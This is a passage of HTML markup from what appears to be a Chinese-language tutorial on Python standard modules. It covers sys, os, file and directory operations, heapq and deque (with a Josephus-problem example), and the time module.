class=\"string\">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>, <span class=\"string\">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages/PILcompat&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages/gtk-2.0&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages/ubuntu-sso-client&#x27;</span>]</span><br><span class=\"line\">sys.path.append(<span class=\"string\">&quot;自定义模块路径&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sys-modules\"><a href=\"#sys-modules\" class=\"headerlink\" title=\"sys.modules\"></a>sys.modules</h4><p>功能：<code>sys.modules</code>是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，<code>sys.modules</code>将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。它拥有字典所拥有的一切方法。</p>\n<p>示例：<code>modules.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.modules.keys()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.modules.values()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.modules[<span class=\"string\">&quot;os&quot;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>运行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python modules.py</span><br><span class=\"line\">[<span class=\"string\">&#x27;copy_reg&#x27;</span>, <span class=\"string\">&#x27;sre_compile&#x27;</span>, <span class=\"string\">&#x27;_sre&#x27;</span>, <span class=\"string\">&#x27;encodings&#x27;</span>, <span class=\"string\">&#x27;site&#x27;</span>, <span class=\"string\">&#x27;__builtin__&#x27;</span>,......</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sys-stdin-stdout-stderr\"><a href=\"#sys-stdin-stdout-stderr\" class=\"headerlink\" title=\"sys.stdin\\stdout\\stderr\"></a>sys.stdin\\stdout\\stderr</h4><p>功能：stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print  不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ),  或者以非标准的方式处理它们</p>\n<p>勿忘初心，放得始终 (ง •_•)ง！</p>\n<h3 id=\"os模块\"><a href=\"#os模块\" class=\"headerlink\" title=\"os模块\"></a>os模块</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">os.sep:取代操作系统特定的路径分隔符</span><br><span class=\"line\">os.name:指示你正在使用的工作平台。比如对于Windows，它是<span class=\"string\">&#x27;nt&#x27;</span>，而对于Linux/Unix用户，它是<span class=\"string\">&#x27;posix&#x27;</span>。</span><br><span class=\"line\">os.getcwd:得到当前工作目录，即当前python脚本工作的目录路径。</span><br><span class=\"line\">os.getenv()和os.putenv:分别用来读取和设置环境变量</span><br><span class=\"line\">os.listdir():返回指定目录下的所有文件和目录名</span><br><span class=\"line\">os.remove(file):删除一个文件</span><br><span class=\"line\">os.stat（file）:获得文件属性</span><br><span class=\"line\">os.chmod(file):修改文件权限和时间戳</span><br><span class=\"line\">os.mkdir(name):创建目录</span><br><span class=\"line\">os.rmdir(name):删除目录</span><br><span class=\"line\">os.removedirs（r“c：\\python”）:删除多个目录</span><br><span class=\"line\">os.system():运行shell命令</span><br><span class=\"line\">os.exit():终止当前进程</span><br><span class=\"line\">os.linesep:给出当前平台的行终止符。例如，Windows使用<span class=\"string\">&#x27;\\r\\n&#x27;</span>，Linux使用<span class=\"string\">&#x27;\\n&#x27;</span>而Mac使用<span class=\"string\">&#x27;\\r&#x27;</span></span><br><span class=\"line\">os.path.split():返回一个路径的目录名和文件名</span><br><span class=\"line\">os.path.isfile()和os.path.isdir()分别检验给出的路径是一个目录还是文件</span><br><span class=\"line\">os.path.existe():检验给出的路径是否真的存在</span><br><span class=\"line\">os.listdir(dirname):列出dirname下的目录和文件</span><br><span class=\"line\">os.getcwd():获得当前工作目录</span><br><span class=\"line\">os.curdir:返回当前目录（<span class=\"string\">&#x27;.&#x27;</span>）</span><br><span class=\"line\">os.chdir(dirname):改变工作目录到dirname</span><br><span class=\"line\">os.path.isdir(name):判断name是不是目录，不是目录就返回false</span><br><span class=\"line\">os.path.isfile(name):判断name这个文件是否存在，不存在返回false</span><br><span class=\"line\">os.path.exists(name):判断是否存在文件或目录name</span><br><span class=\"line\">os.path.getsize(name):或得文件大小，如果name是目录返回<span class=\"number\">0L</span></span><br><span class=\"line\">os.path.abspath(name):获得绝对路径</span><br><span class=\"line\">os.path.isabs():判断是否为绝对路径</span><br><span class=\"line\">os.path.normpath(path):规范path字符串形式</span><br><span class=\"line\">os.path.split(name):分割文件名与目录（事实上，如果你完全使用目录，它也会将最后一个目录作为文件名而分离，同时它不会判断文件或目录是否存在）</span><br><span class=\"line\">os.path.splitext():分离文件名和扩展名</span><br><span class=\"line\">os.path.join(path,name):连接目录与文件名或目录</span><br><span class=\"line\">os.path.basename(path):返回文件名</span><br><span class=\"line\">os.path.dirname(path):返回文件路径</span><br></pre></td></tr></table></figure>\n\n<p>文件操作：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">os.mknod(<span class=\"string\">&quot;text.txt&quot;</span>)：创建空文件</span><br><span class=\"line\">fp = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;text.txt&quot;</span>,w):直接打开一个文件，如果文件不存在就创建文件</span><br></pre></td></tr></table></figure>\n\n<p>open 模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w 写方式</span><br><span class=\"line\">a 追加模式打开（从EOF开始，必要时创建新文件）</span><br><span class=\"line\">r+ 以读写模式打开</span><br><span class=\"line\">w+ 以读写模式打开</span><br><span class=\"line\">a+ 以读写模式打开</span><br><span class=\"line\">rb 以二进制读模式打开</span><br><span class=\"line\">wb 以二进制写模式打开 (参见 w )</span><br><span class=\"line\">ab 以二进制追加模式打开 (参见 a )</span><br><span class=\"line\">rb+ 以二进制读写模式打开 (参见 r+ )</span><br><span class=\"line\">wb+ 以二进制读写模式打开 (参见 w+ )</span><br><span class=\"line\">ab+ 以二进制读写模式打开 (参见 a+ )</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fp.read([size])  <span class=\"comment\">#size为读取的长度，以byte为单位</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.readline([size])  <span class=\"comment\">#读一行，如果定义了size，有可能返回的只是一行的一部分</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.readlines([size])  <span class=\"comment\">#把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.write(<span class=\"built_in\">str</span>)  <span class=\"comment\">#把str写到文件中，write()并不会在str后加上一个换行符</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.writelines(seq)  <span class=\"comment\">#把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入，不会在每行后面加上任何东西。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.close()  <span class=\"comment\">#关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己关闭的习惯。 如果一个文件在关闭后还对其进行操作会产生ValueError</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.flush()  <span class=\"comment\">#把缓冲区的内容写入硬盘</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.fileno()  <span class=\"comment\">#返回一个长整型的”文件标签“</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.isatty()  <span class=\"comment\">#文件是否是一个终端设备文件（unix系统中的）</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.tell()  <span class=\"comment\">#返回文件操作标记的当前位置，以文件的开头为原点</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.<span class=\"built_in\">next</span>()  <span class=\"comment\">#返回下一行，并将文件操作标记位移到下一行。把一个file用于for … in file这样的语句时，就是调用next()函数来实现遍历的。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.seek(offset[,whence])  <span class=\"comment\">#将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的，一般为正数。但如果提供了whence参数就不一定了，whence可以为0表示从头开始计算，1表示以当前位置为原点计算。2表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进行写操作时，文件操作标记会自动返回到文件末尾。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.truncate([size])  <span class=\"comment\">#把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大，依据系统的不同可能是不改变文件，也可能是用0把文件补到相应的大小，也可能是以一些随机的内容加上去。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">目录操作</span><br><span class=\"line\"> </span><br><span class=\"line\">os.mkdir(<span class=\"string\">&quot;file&quot;</span>)　　创建目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copyfile(<span class=\"string\">&quot;oldfile&quot;</span>,<span class=\"string\">&quot;newfile&quot;</span>)　　复制文件:oldfile和newfile都只能是文件</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copy(<span class=\"string\">&quot;oldfile&quot;</span>,<span class=\"string\">&quot;newfile&quot;</span>)  oldfile只能是文件夹，newfile可以是文件，也可以是目标目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copytree(<span class=\"string\">&quot;olddir&quot;</span>,<span class=\"string\">&quot;newdir&quot;</span>)  复制文件夹.olddir和newdir都只能是目录，且newdir必须不存在</span><br><span class=\"line\"> </span><br><span class=\"line\">os.rename(<span class=\"string\">&quot;oldname&quot;</span>,<span class=\"string\">&quot;newname&quot;</span>)  重命名文件（目录）.文件或目录都是使用这条命令</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.move(<span class=\"string\">&quot;oldpos&quot;</span>,<span class=\"string\">&quot;newpos&quot;</span>)  移动文件（目录）</span><br><span class=\"line\"> </span><br><span class=\"line\">os.rmdir(<span class=\"string\">&quot;dir&quot;</span>)  只能删除空目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.rmtree(<span class=\"string\">&quot;dir&quot;</span>)  空目录、有内容的目录都可以删</span><br><span class=\"line\"> </span><br><span class=\"line\">os.chdir(<span class=\"string\">&quot;path&quot;</span>)  转换目录，换路径</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"集合、堆和双端队列-heap模块、deque类\"><a href=\"#集合、堆和双端队列-heap模块、deque类\" class=\"headerlink\" title=\"集合、堆和双端队列(heap模块、deque类)\"></a>集合、堆和双端队列(heap模块、deque类)</h3><p>集合(set)、堆(heap)、双端队列(deque)</p>\n<h4 id=\"堆导入-heapq-模块、双端队列导入collections模块。\"><a href=\"#堆导入-heapq-模块、双端队列导入collections模块。\" class=\"headerlink\" title=\"堆导入 heapq 模块、双端队列导入collections模块。\"></a>堆导入 heapq 模块、双端队列导入collections模块。</h4><table>\n<thead>\n<tr>\n<th>函数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>heappush(heap,value)</td>\n<td>将value加入堆</td>\n</tr>\n<tr>\n<td>heappop(heap)</td>\n<td>将堆中的最小值弹出，并返回该最小值</td>\n</tr>\n<tr>\n<td>heapify(heap)</td>\n<td>将列表转换为堆，也就是重新安排列表中元素的顺序</td>\n</tr>\n<tr>\n<td>heapreplace(heap,value)</td>\n<td>将堆中的最小值弹出，并同时将value入堆</td>\n</tr>\n<tr>\n<td>nlargest(n,iter)</td>\n<td>返回可迭代对象中前n个最大值，以列表形式返回</td>\n</tr>\n<tr>\n<td>nsmallest(n,iter)</td>\n<td>返回可迭代对象中前n个最小值，以列表形式返回</td>\n</tr>\n<tr>\n<td>merge(*iter,key)</td>\n<td>合并多个有序的迭代对象，如果指定key，则对每个元素的排序会利用key指定的函数</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> deque</span><br></pre></td></tr></table></figure>\n\n<p>collections 是 python 内建的一个集合模块，里面封装了许多集合类，其中队列相关的集合只有一个：deque。<br>deque 是双边队列（double-ended queue），具有队列和栈的性质，在 list 的基础上增加了移动、旋转和增删等。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = collections.deque([])</span><br><span class=\"line\">d.append(<span class=\"string\">&#x27;a&#x27;</span>) <span class=\"comment\"># 在最右边添加一个元素，此时 d=deque(&#x27;a&#x27;)</span></span><br><span class=\"line\">d.appendleft(<span class=\"string\">&#x27;b&#x27;</span>) <span class=\"comment\"># 在最左边添加一个元素，此时 d=deque([&#x27;b&#x27;, &#x27;a&#x27;])</span></span><br><span class=\"line\">d.extend([<span class=\"string\">&#x27;c&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>]) <span class=\"comment\"># 在最右边添加所有元素，此时 d=deque([&#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class=\"line\">d.extendleft([<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;f&#x27;</span>]) <span class=\"comment\"># 在最左边添加所有元素，此时 d=deque([&#x27;f&#x27;, &#x27;e&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class=\"line\">d.pop() <span class=\"comment\"># 将最右边的元素取出，返回 &#x27;d&#x27;，此时 d=deque([&#x27;f&#x27;, &#x27;e&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;])</span></span><br><span class=\"line\">d.popleft() <span class=\"comment\"># 将最左边的元素取出，返回 &#x27;f&#x27;，此时 d=deque([&#x27;e&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;])</span></span><br><span class=\"line\">d.rotate(-<span class=\"number\">2</span>) <span class=\"comment\"># 向左旋转两个位置（正数则向右旋转），此时 d=deque([&#x27;a&#x27;, &#x27;c&#x27;, &#x27;e&#x27;, &#x27;b&#x27;])</span></span><br><span class=\"line\">d.count(<span class=\"string\">&#x27;a&#x27;</span>) <span class=\"comment\"># 队列中&#x27;a&#x27;的个数，返回 1</span></span><br><span class=\"line\">d.remove(<span class=\"string\">&#x27;c&#x27;</span>) <span class=\"comment\"># 从队列中将&#x27;c&#x27;删除，此时 d=deque([&#x27;a&#x27;, &#x27;e&#x27;, &#x27;b&#x27;])</span></span><br><span class=\"line\">d.reverse() <span class=\"comment\"># 将队列倒序，此时 d=deque([&#x27;b&#x27;, &#x27;e&#x27;, &#x27;a&#x27;])</span></span><br></pre></td></tr></table></figure>\n\n<p>使用deque解决约瑟夫问题：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; 约瑟夫算法</span></span><br><span class=\"line\"><span class=\"string\">据说著名犹太历史学家 Josephus 有过以下的故事：</span></span><br><span class=\"line\"><span class=\"string\">在罗马人占领桥塔帕特后，39个犹太人与 Josephus 及他的朋友躲到一个洞中，</span></span><br><span class=\"line\"><span class=\"string\">39个犹太人决定宁愿死也不要被敌人抓到，于是决定了一个自杀方式，41个人排成一个圆圈，</span></span><br><span class=\"line\"><span class=\"string\">由第1个人开始报数，每报数到第3人该人就必须自杀，然后再由下一个重新报数，</span></span><br><span class=\"line\"><span class=\"string\">直到所有人都自杀身亡为止。然而 Josephus 和他的朋友并不想自杀，</span></span><br><span class=\"line\"><span class=\"string\">问他俩安排的哪两个位置可以逃过这场死亡游戏？</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> collections</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ysf</span>(<span class=\"params\">a, b</span>):</span></span><br><span class=\"line\">    d = collections.deque(<span class=\"built_in\">range</span>(<span class=\"number\">1</span>, a+<span class=\"number\">1</span>)) <span class=\"comment\"># 将每个人依次编号，放入到队列中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> d:</span><br><span class=\"line\">        d.rotate(-b) <span class=\"comment\"># 队列向左旋转b步</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(d.pop()) <span class=\"comment\"># 将最右边的删除，即自杀的人</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    ysf(<span class=\"number\">41</span>,<span class=\"number\">3</span>) <span class=\"comment\"># 输出的是自杀的顺序。最后两个是16和31，说明这两个位置可以保证他俩的安全。</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"time模块\"><a href=\"#time模块\" class=\"headerlink\" title=\"time模块\"></a>time模块</h3><p>time 模块主要包含各种提供日期、时间功能的类和函数。该模块既提供了把日期、时间格式化为字符串的功能，也提供了从字符串恢复日期、时间的功能。</p>\n<p>在 Python 的交互式解释器中先导入 time 模块，然后输入 [e for e in dir(time) if not e.startswith(‘_’)] 命令，即可看到该模块所包含的全部属性和函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>[e <span class=\"keyword\">for</span> e <span class=\"keyword\">in</span> <span class=\"built_in\">dir</span>(time) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> e.startswith(<span class=\"string\">&#x27;_&#x27;</span>)]</span><br><span class=\"line\">[<span class=\"string\">&#x27;altzone&#x27;</span>, <span class=\"string\">&#x27;asctime&#x27;</span>, <span class=\"string\">&#x27;clock&#x27;</span>, <span class=\"string\">&#x27;ctime&#x27;</span>, <span class=\"string\">&#x27;daylight&#x27;</span>, <span class=\"string\">&#x27;get_clock_info&#x27;</span>, <span class=\"string\">&#x27;gmtime&#x27;</span>, <span class=\"string\">&#x27;localtime&#x27;</span>, <span class=\"string\">&#x27;mktime&#x27;</span>, </span><br><span class=\"line\"><span class=\"string\">&#x27;monotonic&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">&#x27;perf_counter&#x27;</span>, <span class=\"string\">&#x27;process_time&#x27;</span>, <span class=\"string\">&#x27;sleep&#x27;</span>, <span class=\"string\">&#x27;strftime&#x27;</span>, <span class=\"string\">&#x27;strptime&#x27;</span>, <span class=\"string\">&#x27;struct_time&#x27;</span>, <span class=\"string\">&#x27;time&#x27;</span>, <span class=\"string\">&#x27;timezone&#x27;</span>, <span class=\"string\">&#x27;tzname&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>在 time 模块内提供了一个 time.struct_time 类，该类代表一个时间对象，它主要包含 9 个属性，每个属性的信息如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th>字段名</th>\n<th>字段含义</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>tm_year</td>\n<td>年</td>\n<td>如 2017、2018 等</td>\n</tr>\n<tr>\n<td>tm_mon</td>\n<td>月</td>\n<td>如 2、3 等，范围为 1~12</td>\n</tr>\n<tr>\n<td>tm_mday</td>\n<td>日</td>\n<td>如 2、3 等，范围为 1~31</td>\n</tr>\n<tr>\n<td>tm_hour</td>\n<td>时</td>\n<td>如 2、3 等，范围为 0~23</td>\n</tr>\n<tr>\n<td>tm_min</td>\n<td>分</td>\n<td>如 2、3 等，范围为 0~59</td>\n</tr>\n<tr>\n<td>tm_sec</td>\n<td>秒</td>\n<td>如 2、3 等，范围为 0~59</td>\n</tr>\n<tr>\n<td>tm_wday</td>\n<td>周</td>\n<td>周一为 0，范围为 0~6</td>\n</tr>\n<tr>\n<td>tm_yday</td>\n<td>一年内第几天</td>\n<td>如 65，范围 1~366</td>\n</tr>\n<tr>\n<td>tm_isdst</td>\n<td>夏时令</td>\n<td>0、1 或 -1</td>\n</tr>\n</tbody></table>\n<p>比如，Python 可以用 time.struct_time(tm_year=2018, tm_mon=5, tm_mday=2, tm_hour=8,  tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0) 很清晰地代表时间。</p>\n<p>此外，Python 还可以用一个包含 9 个元素的元组来代表时间，该元组的 9 个元素和 struct_time 对象中 9 个属性的含义是一一对应的。比如程序可以使用（2018, 5, 2, 8, 0, 30, 3, 1, 0）来代表时间。</p>\n<p>在日期、时间模块内常用的功能函数如下：</p>\n<p>time.asctime([t])：将时间元组或 struct_time 转换为时间字符串。如果不指定参数 t，则默认转换当前时间。</p>\n<p>time.ctime([secs])：将以秒数代表的时间转换为时间宇符串。</p>\n<p>time.gmtime([secs])：将以秒数代表的时间转换为 struct_time 对象。如果不传入参数，则使用当前时间。</p>\n<p>time.localtime([secs])：将以秒数代表的时间转换为代表当前时间的 struct_time 对象。如果不传入参数，则使用当前时间。</p>\n<p>time.mktime(t)：它是 localtime 的反转函数，用于将 struct_time 对象或元组代表的时间转换为从 1970 年 1 月 1 日 0 点整到现在过了多少秒。</p>\n<p>time.perf_counter()：返回性能计数器的值。以秒为单位。</p>\n<p>time.process_time()：返回当前进程使用 CPU 的时间。以秒为单位。</p>\n<p>time.sleep(secs)：暂停 secs 秒，什么都不干。</p>\n<p>time.strftime(format[, t])：将时间元组或 struct_time 对象格式化为指定格式的时间字符串。如果不指定参数 t，则默认转换当前时间。</p>\n<p>time.strptime(string[, format])：将字符串格式的时间解析成 struct_time 对象。</p>\n<p>time.time()：返回从 1970 年 1 月 1 日 0 点整到现在过了多少秒。</p>\n<p>time.timezone：返回本地时区的时间偏移，以秒为单位。</p>\n<p>time.tzname：返回本地时区的名字。</p>\n<p>下面程序示范了 time 棋块的功能函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"comment\"># 将当前时间转换为时间字符串</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.asctime())</span><br><span class=\"line\"><span class=\"comment\"># 将指定时间转换时间字符串，时间元组的后面3个元素没有设置</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.asctime((<span class=\"number\">2018</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span> ,<span class=\"number\">0</span>))) <span class=\"comment\"># Mon Feb  4 11:08:23 2018</span></span><br><span class=\"line\"><span class=\"comment\"># 将以秒数为代表的时间转换为时间字符串</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.ctime(<span class=\"number\">30</span>)) <span class=\"comment\"># Thu Jan  1 08:00:30 1970</span></span><br><span class=\"line\"><span class=\"comment\"># 将以秒数为代表的时间转换为struct_time对象。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.gmtime(<span class=\"number\">30</span>))</span><br><span class=\"line\"><span class=\"comment\"># 将当前时间转换为struct_time对象。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.gmtime())</span><br><span class=\"line\"><span class=\"comment\"># 将以秒数为代表的时间转换为代表当前时间的struct_time对象</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.localtime(<span class=\"number\">30</span>))</span><br><span class=\"line\"><span class=\"comment\"># 将元组格式的时间转换为秒数代表的时间</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.mktime((<span class=\"number\">2018</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span> ,<span class=\"number\">0</span>))) <span class=\"comment\"># 1517713703.0</span></span><br><span class=\"line\"><span class=\"comment\"># 返回性能计数器的值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.perf_counter())</span><br><span class=\"line\"><span class=\"comment\"># 返回当前进程使用CPU的时间</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.process_time())</span><br><span class=\"line\"><span class=\"comment\">#time.sleep(10)</span></span><br><span class=\"line\"><span class=\"comment\"># 